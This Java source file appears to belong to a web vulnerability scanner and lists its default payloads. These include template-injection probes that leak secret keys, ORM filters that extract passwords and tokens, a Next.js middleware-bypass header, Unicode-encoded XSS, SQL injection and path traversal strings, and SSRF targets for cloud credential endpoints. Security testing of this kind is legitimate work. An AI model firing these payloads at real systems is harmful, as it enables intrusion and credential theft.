package top10.payloads;

import top10.model.PayloadEntry;

import java.util.ArrayList;
import java.util.List;

import static top10.model.PayloadEntry.defaultPayload;
import static top10.model.PayloadEntry.engineDetect;

/**
 * Provides all hardcoded default payloads for every scanner module.
 * Each payload is created via the factory methods on {@link PayloadEntry}.
 */
public final class DefaultPayloads {

    private DefaultPayloads() {}

    public static List<PayloadEntry> getAll() {
        List<PayloadEntry> payloads = new ArrayList<>();

        addSstiPayloads(payloads);
        addOrmPayloads(payloads);
        addNextjsPayloads(payloads);
        addUnicodePayloads(payloads);
        addSsrfPayloads(payloads);
        addParserPayloads(payloads);
        addHttp2Payloads(payloads);
        addEtagPayloads(payloads);

        return payloads;
    }

    // -------------------------------------------------------------------------
    // MODULE: ssti
    // -------------------------------------------------------------------------

    private static void addSstiPayloads(List<PayloadEntry> p) {

        // Category: polyglot
        p.add(defaultPayload("ssti", "polyglot",
                "<%'${{/#{@}}%>{{",
                "Error polyglot - triggers error in ALL 44 engines"));
        p.add(defaultPayload("ssti", "polyglot",
                "p \">[[${{1}}]]",
                "Non-error polyglot #1"));
        p.add(defaultPayload("ssti", "polyglot",
                "<%=1%>@*#{1}",
                "Non-error polyglot #2"));
        p.add(defaultPayload("ssti", "polyglot",
                "{##}/*{{.}}*/",
                "Non-error polyglot #3"));
        p.add(defaultPayload("ssti", "polyglot",
                "${{<%[%'\"}}%\\",
                "Classic fuzz string"));
        p.add(defaultPayload("ssti", "polyglot",
                "{{7*7}}${7*7}<%=7*7%>#{7*7}{7*7}${{7*7}}",
                "Math polyglot"));

        // Category: error-trigger
        p.add(defaultPayload("ssti", "error-trigger",
                "{{",
                "Jinja2/Twig unclosed"));
        p.add(defaultPayload("ssti", "error-trigger",
                "${",
                "Freemarker/Java EL"));
        p.add(defaultPayload("ssti", "error-trigger",
                "<%",
                "ERB/JSP"));
        p.add(defaultPayload("ssti", "error-trigger",
                "#{",
                "Pebble/Thymeleaf"));
        p.add(defaultPayload("ssti", "error-trigger",
                "{%",
                "Jinja2 block"));
        p.add(defaultPayload("ssti", "error-trigger",
                "{{7/0}}",
                "Division by zero - Jinja2",
                "CVE-2025-1302"));
        p.add(defaultPayload("ssti", "error-trigger",
                "${7/0}",
                "Division by zero - Java EL"));
        p.add(defaultPayload("ssti", "error-trigger",
                "<%=7/0%>",
                "Division by zero - ERB"));

        // Category: engine-detect
        p.add(engineDetect("ssti",
                "{{7*'7'}}",
                "7777777=Jinja2,49=Twig",
                "Jinja2 vs Twig differentiator"));
        p.add(engineDetect("ssti",
                "${7*7}",
                "49=Freemarker/JavaEL/Thymeleaf",
                "Java template engine detect"));
        p.add(engineDetect("ssti",
                "<%= 7*7 %>",
                "49=ERB",
                "ERB detection"));
        p.add(engineDetect("ssti",
                "#{7*7}",
                "49=Pebble/Thymeleaf",
                "Pebble/Thymeleaf detection"));
        p.add(engineDetect("ssti",
                "{7*7}",
                "49=Smarty",
                "Smarty detection"));
        p.add(engineDetect("ssti",
                "${{7*7}}",
                "49=Thymeleaf",
                "Thymeleaf detection"));
        p.add(engineDetect("ssti",
                "{{config}}",
                "Config=Jinja2",
                "Jinja2 Flask config leak"));
        p.add(engineDetect("ssti",
                "${.version}",
                "version=Freemarker",
                "Freemarker version leak"));
        p.add(engineDetect("ssti",
                "{{_self.env}}",
                "Twig_Environment=Twig",
                "Twig environment leak"));
        p.add(engineDetect("ssti",
                "#set($x=7*7)${x}",
                "49=Velocity",
                "Velocity detection"));
        p.add(engineDetect("ssti",
                "{{\"meow\".toUpperCase()}}",
                "MEOW=Pebble",
                "Pebble string method"));

        // Category: error-based-blind
        p.add(defaultPayload("ssti", "error-based-blind",
                "{{1/0}}",
                "Boolean error: Jinja2 error-based blind (error side)"));
        p.add(defaultPayload("ssti", "error-based-blind",
                "{{1/1}}",
                "Boolean error: Jinja2 error-based blind (no-error side)"));
        p.add(defaultPayload("ssti", "error-based-blind",
                "${1/0}",
                "Java EL boolean error (error side)"));
        p.add(defaultPayload("ssti", "error-based-blind",
                "${1/1}",
                "Java EL boolean error (no-error side)"));
        p.add(defaultPayload("ssti", "error-based-blind",
                "<%=1/0%>",
                "ERB boolean error (error side)"));
        p.add(defaultPayload("ssti", "error-based-blind",
                "<%=1/1%>",
                "ERB boolean error (no-error side)"));
        p.add(defaultPayload("ssti", "error-based-blind",
                "{{config.__class__}}",
                "Jinja2 error leaks class name"));
        p.add(defaultPayload("ssti", "error-based-blind",
                "{{config.SECRET_KEY.__class__}}",
                "Jinja2 deeper error-based data leak"));
    }

    // -------------------------------------------------------------------------
    // MODULE: orm
    // -------------------------------------------------------------------------

    private static void addOrmPayloads(List<PayloadEntry> p) {

        // Category: orm-detect
        p.add(defaultPayload("orm", "orm-detect",
                "password__startswith=a",
                "Django double-underscore startswith"));
        p.add(defaultPayload("orm", "orm-detect",
                "password__regex=^a",
                "Django regex filter"));
        p.add(defaultPayload("orm", "orm-detect",
                "password__icontains=test",
                "Django case-insensitive contains"));
        p.add(defaultPayload("orm", "orm-detect",
                "email__contains=@",
                "Django contains on email"));
        p.add(defaultPayload("orm", "orm-detect",
                "created_by__password__startswith=a",
                "Django relational traversal"));
        p.add(defaultPayload("orm", "orm-detect",
                "user__password__startswith=a",
                "Django relational traversal"));
        p.add(defaultPayload("orm", "orm-detect",
                "{\"password\":{\"startsWith\":\"a\"}}",
                "Prisma startsWith operator",
                "CVE-2023-30843"));
        p.add(defaultPayload("orm", "orm-detect",
                "{\"password\":{\"not\":\"\"}}",
                "Prisma not-empty filter"));
        p.add(defaultPayload("orm", "orm-detect",
                "{\"password\":{\"contains\":\"a\"}}",
                "Prisma contains filter"));
        p.add(defaultPayload("orm", "orm-detect",
                "{\"createdBy\":{\"password\":{\"startsWith\":\"a\"}}}",
                "Prisma relational traversal"));
        p.add(defaultPayload("orm", "orm-detect",
                "{\"include\":{\"createdBy\":true}}",
                "Prisma include returns all fields"));
        p.add(defaultPayload("orm", "orm-detect",
                "$filter=Password gt 'a'",
                "OData greater-than filter"));
        p.add(defaultPayload("orm", "orm-detect",
                "$filter=Password eq null",
                "OData null check"));
        p.add(defaultPayload("orm", "orm-detect",
                "$filter=startswith(Password,'a')",
                "OData startswith function"));
        p.add(defaultPayload("orm", "orm-detect",
                "$orderby=Password asc",
                "OData ordering by sensitive field"));
        p.add(defaultPayload("orm", "orm-detect",
                "$expand=CreatedBy($select=Password)",
                "OData expand+select"));
        p.add(defaultPayload("orm", "orm-detect",
                "$select=Password,Token,Secret",
                "OData select sensitive fields"));
        p.add(defaultPayload("orm", "orm-detect",
                "q[password_start]=a",
                "Ransack startswith (Rails)"));
        p.add(defaultPayload("orm", "orm-detect",
                "q[password_cont]=a",
                "Ransack contains (Rails)"));
        p.add(defaultPayload("orm", "orm-detect",
                "q[reset_token_start]=a",
                "Ransack reset token extraction"));
        p.add(defaultPayload("orm", "orm-detect",
                "q=password=~a",
                "Harbor regex filter",
                "CVE-2025-30086"));
        p.add(defaultPayload("orm", "orm-detect",
                "q=salt=~a",
                "Harbor salt leak",
                "CVE-2025-30086"));

        // Category: sensitive-fields
        String[] sensitiveFields = {
                "password", "passwd", "pass", "hash", "password_hash",
                "password_digest", "secret", "token", "api_key", "apikey",
                "api_token", "access_token", "refresh_token", "salt", "otp",
                "totp_secret", "tfa_secret", "two_factor_secret", "resetToken",
                "reset_token", "password_reset_token", "reset_password_token",
                "secret_key", "private_key", "encryption_key", "ssn",
                "credit_card", "card_number", "session_token", "session_key",
                "auth_token", "webhook_secret", "signing_secret", "client_secret"
        };
        for (String field : sensitiveFields) {
            p.add(defaultPayload("orm", "sensitive-fields",
                    field,
                    "Sensitive field name for ORM probing",
                    "CVE-2023-22894", "CVE-2023-47117", "CVE-2025-64748"));
        }

        // Category: relational-prefixes
        String[] relationalPrefixes = {
                "created_by__", "user__", "author__", "owner__", "admin__",
                "manager__", "assignee__", "reviewer__", "approver__", "creator__",
                "createdBy.", "user.", "author.", "owner."
        };
        for (String prefix : relationalPrefixes) {
            p.add(defaultPayload("orm", "relational-prefixes",
                    prefix,
                    "Relational traversal prefix"));
        }
    }

    // -------------------------------------------------------------------------
    // MODULE: nextjs
    // -------------------------------------------------------------------------

    private static void addNextjsPayloads(List<PayloadEntry> p) {

        // Category: nextjs-fingerprint
        p.add(defaultPayload("nextjs", "nextjs-fingerprint",
                "/_next/static/",
                "Static asset path"));
        p.add(defaultPayload("nextjs", "nextjs-fingerprint",
                "/__nextjs_original-stack-frame",
                "Dev mode indicator"));
        p.add(defaultPayload("nextjs", "nextjs-fingerprint",
                "/_next/data/",
                "Data routes"));
        p.add(defaultPayload("nextjs", "nextjs-fingerprint",
                "/_next/image",
                "Image optimization"));

        // Category: nextjs-headers
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "x-middleware-prefetch: 1",
                "Changes response to prefetch format",
                "CVE-2024-46982"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "x-middleware-subrequest: middleware",
                "Bypasses middleware entirely",
                "CVE-2025-29927"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "x-middleware-subrequest: src/middleware",
                "Alternate path for subrequest bypass",
                "CVE-2025-29927"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "x-nextjs-data: 1",
                "Forces data request format"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "Rsc: 1",
                "React Server Components stream"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "Next-Router-State-Tree: %5B%22%22%5D",
                "Router state manipulation"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "Next-Router-Prefetch: 1",
                "Prefetch behavior trigger"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "x-invoke-status: 200",
                "Internal status override"));
        p.add(defaultPayload("nextjs", "nextjs-headers",
                "x-invoke-path: /",
                "Internal path override"));

        // Category: nextjs-params
        p.add(defaultPayload("nextjs", "nextjs-params",
                "__nextDataReq=1",
                "Forces data request for cache poisoning",
                "CVE-2024-46982"));
        p.add(defaultPayload("nextjs", "nextjs-params",
                "_rsc=RANDOM",
                "RSC param cache key pollution"));
        p.add(defaultPayload("nextjs", "nextjs-params",
                "__nextLocale=RANDOM",
                "Locale param"));
    }

    // -------------------------------------------------------------------------
    // MODULE: unicode
    // -------------------------------------------------------------------------

    private static void addUnicodePayloads(List<PayloadEntry> p) {

        // Category: fullwidth-map
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF1C",
                "Fullwidth < (U+FF1C)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF1E",
                "Fullwidth > (U+FF1E)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF07",
                "Fullwidth ' (U+FF07)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF02",
                "Fullwidth \" (U+FF02)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF0F",
                "Fullwidth / (U+FF0F)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF3C",
                "Fullwidth \\ (U+FF3C)",
                "CVE-2025-52488"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF0E",
                "Fullwidth . (U+FF0E)",
                "CVE-2024-43093", "CVE-2025-52488"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF20",
                "Fullwidth @ (U+FF20)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF1D",
                "Fullwidth = (U+FF1D)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF08",
                "Fullwidth ( (U+FF08)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF09",
                "Fullwidth ) (U+FF09)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF1B",
                "Fullwidth ; (U+FF1B)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF5C",
                "Fullwidth | (U+FF5C)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF06",
                "Fullwidth & (U+FF06)"));
        p.add(defaultPayload("unicode", "fullwidth-map",
                "\uFF03",
                "Fullwidth # (U+FF03)"));

        // Category: math-equivalent
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u24D0",
                "Circled a (U+24D0)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u210C",
                "Script capital H (U+210C)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\uFB01",
                "Ligature fi (U+FB01)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u211D",
                "Double-struck R (U+211D)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u2102",
                "Double-struck C (U+2102)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u2147",
                "Euler constant e (U+2147)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u2148",
                "Imaginary unit i (U+2148)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u00B9",
                "Superscript 1 (U+00B9)"));
        p.add(defaultPayload("unicode", "math-equivalent",
                "\u00B2",
                "Superscript 2 (U+00B2)"));

        // Category: attack-payloads
        p.add(defaultPayload("unicode", "attack-payloads",
                "\uFF1C\uFF53\uFF43\uFF52\uFF49\uFF50\uFF54\uFF1E\uFF41\uFF4C\uFF45\uFF52\uFF54\uFF08\uFF11\uFF09\uFF1C\uFF0F\uFF53\uFF43\uFF52\uFF49\uFF50\uFF54\uFF1E",
                "XSS via fullwidth <script>alert(1)</script>"));
        p.add(defaultPayload("unicode", "attack-payloads",
                "\uFF0E\uFF0E\uFF0F\uFF0E\uFF0E\uFF0F\uFF45\uFF54\uFF43\uFF0F\uFF50\uFF41\uFF53\uFF53\uFF57\uFF44",
                "Path traversal via fullwidth ../../etc/passwd"));
        p.add(defaultPayload("unicode", "attack-payloads",
                "\uFF3C\uFF3C\uFF41\uFF54\uFF54\uFF41\uFF43\uFF4B\uFF45\uFF52\uFF0E\uFF43\uFF4F\uFF4D\uFF3C\uFF53\uFF48\uFF41\uFF52\uFF45",
                "UNC path via fullwidth",
                "CVE-2025-52488"));
        p.add(defaultPayload("unicode", "attack-payloads",
                "\uFF07 \uFF2F\uFF32 \uFF071\uFF07\uFF1D\uFF071",
                "SQL injection via fullwidth"));
        p.add(defaultPayload("unicode", "attack-payloads",
                "\uFF41\uFF44\uFF4D\uFF49\uFF4E",
                "Username collision via fullwidth 'admin'"));
    }

    // -------------------------------------------------------------------------
    // MODULE: ssrf
    // -------------------------------------------------------------------------

    private static void addSsrfPayloads(List<PayloadEntry> p) {

        // Category: url-params
        String[] urlParams = {
                "url", "link", "redirect", "callback", "next", "return", "dest",
                "target", "uri", "path", "continue", "window", "data", "reference",
                "site", "html", "val", "validate", "domain", "feed", "host", "port",
                "to", "out", "view", "dir", "show", "navigation", "open", "file",
                "doc", "pg", "style", "pdf", "template", "php_path", "img", "src",
                "redirect_uri", "return_url", "next_url", "callback_url", "goto",
                "forward", "location", "jump", "fetch", "load", "proxy", "endpoint"
        };
        for (String param : urlParams) {
            p.add(defaultPayload("ssrf", "url-params",
                    param,
                    "URL parameter name for SSRF testing"));
        }

        // Category: internal-targets
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://127.0.0.1",
                "Localhost"));
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://localhost",
                "Localhost hostname"));
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://169.254.169.254/latest/meta-data/",
                "AWS IMDS"));
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "AWS IAM credentials"));
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://metadata.google.internal/computeMetadata/v1/",
                "GCP metadata"));
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "Azure metadata"));
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://100.100.100.200/latest/meta-data/",
                "Alibaba Cloud metadata"));
        p.add(defaultPayload("ssrf", "internal-targets",
                "http://169.254.170.2/v2/credentials",
                "AWS ECS credentials"));
    }

    // -------------------------------------------------------------------------
    // MODULE: parser
    // -------------------------------------------------------------------------

    private static void addParserPayloads(List<PayloadEntry> p) {

        // Category: duplicate-key
        p.add(defaultPayload("parser", "duplicate-key",
                "{\"role\":\"user\",\"role\":\"admin\"}",
                "First-wins vs last-wins role override"));
        p.add(defaultPayload("parser", "duplicate-key",
                "{\"admin\":false,\"admin\":true}",
                "Boolean admin override"));
        p.add(defaultPayload("parser", "duplicate-key",
                "{\"price\":100,\"price\":0}",
                "Price manipulation"));

        // Category: content-type-confusion
        p.add(defaultPayload("parser", "content-type-confusion",
                "application/json",
                "JSON to form-urlencoded swap"));
        p.add(defaultPayload("parser", "content-type-confusion",
                "application/x-www-form-urlencoded",
                "Form to JSON swap"));
        p.add(defaultPayload("parser", "content-type-confusion",
                "text/xml",
                "JSON to XML swap"));
        p.add(defaultPayload("parser", "content-type-confusion",
                "multipart/form-data",
                "JSON to multipart swap"));

        // Category: method-override-headers
        p.add(defaultPayload("parser", "method-override-headers",
                "X-HTTP-Method-Override: PUT",
                "Method override to PUT"));
        p.add(defaultPayload("parser", "method-override-headers",
                "X-HTTP-Method-Override: DELETE",
                "Method override to DELETE"));
        p.add(defaultPayload("parser", "method-override-headers",
                "X-HTTP-Method-Override: PATCH",
                "Method override to PATCH"));
        p.add(defaultPayload("parser", "method-override-headers",
                "X-Method-Override: PUT",
                "X-Method-Override to PUT"));
        p.add(defaultPayload("parser", "method-override-headers",
                "X-HTTP-Method: DELETE",
                "X-HTTP-Method to DELETE"));
        p.add(defaultPayload("parser", "method-override-headers",
                "_method=PUT",
                "Rails-style body method override"));

        // Category: url-parsing
        p.add(defaultPayload("parser", "url-parsing",
                "@evil.com",
                "URL authority confusion"));
        p.add(defaultPayload("parser", "url-parsing",
                "\\@evil.com",
                "Backslash URL confusion"));
        p.add(defaultPayload("parser", "url-parsing",
                "#@evil.com",
                "Fragment URL confusion"));
        p.add(defaultPayload("parser", "url-parsing",
                "..;/admin",
                "Tomcat path traversal"));
        p.add(defaultPayload("parser", "url-parsing",
                "..%00/admin",
                "Null byte traversal"));
        p.add(defaultPayload("parser", "url-parsing",
                "/%2e%2e/admin",
                "Encoded dot traversal"));
        p.add(defaultPayload("parser", "url-parsing",
                "/..%252f..%252f",
                "Double URL encoded traversal"));
    }

    // -------------------------------------------------------------------------
    // MODULE: http2
    // -------------------------------------------------------------------------

    private static void addHttp2Payloads(List<PayloadEntry> p) {

        // Category: connect-targets
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:80",
                "Localhost HTTP"));
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:443",
                "Localhost HTTPS"));
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:8080",
                "Localhost alt HTTP"));
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:8443",
                "Localhost alt HTTPS"));
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:3000",
                "Localhost Node.js"));
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:9090",
                "Localhost proxy/admin"));
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:6379",
                "Localhost Redis"));
        p.add(defaultPayload("http2", "connect-targets",
                "127.0.0.1:5432",
                "Localhost PostgreSQL"));
        p.add(defaultPayload("http2", "connect-targets",
                "localhost:80",
                "Localhost hostname HTTP"));
        p.add(defaultPayload("http2", "connect-targets",
                "localhost:443",
                "Localhost hostname HTTPS"));
        p.add(defaultPayload("http2", "connect-targets",
                "localhost:8080",
                "Localhost hostname alt HTTP"));
        p.add(defaultPayload("http2", "connect-targets",
                "169.254.169.254:80",
                "AWS IMDS HTTP",
                "CVE-2025-49630"));
        p.add(defaultPayload("http2", "connect-targets",
                "169.254.169.254:443",
                "AWS IMDS HTTPS"));
        p.add(defaultPayload("http2", "connect-targets",
                "10.0.0.1:80",
                "Internal network gateway"));
        p.add(defaultPayload("http2", "connect-targets",
                "172.17.0.1:80",
                "Docker host"));
        p.add(defaultPayload("http2", "connect-targets",
                "192.168.1.1:80",
                "Common LAN gateway"));
    }

    // -------------------------------------------------------------------------
    // MODULE: etag
    // -------------------------------------------------------------------------

    private static void addEtagPayloads(List<PayloadEntry> p) {

        // Category: cache-headers
        p.add(defaultPayload("etag", "cache-headers",
                "Cache-Control: no-store",
                "Cache prevention header to check for"));
        p.add(defaultPayload("etag", "cache-headers",
                "Vary: Cookie",
                "Vary header for cookie-based caching"));
        p.add(defaultPayload("etag", "cache-headers",
                "Vary: Authorization",
                "Vary header for auth-based caching"));
    }
}
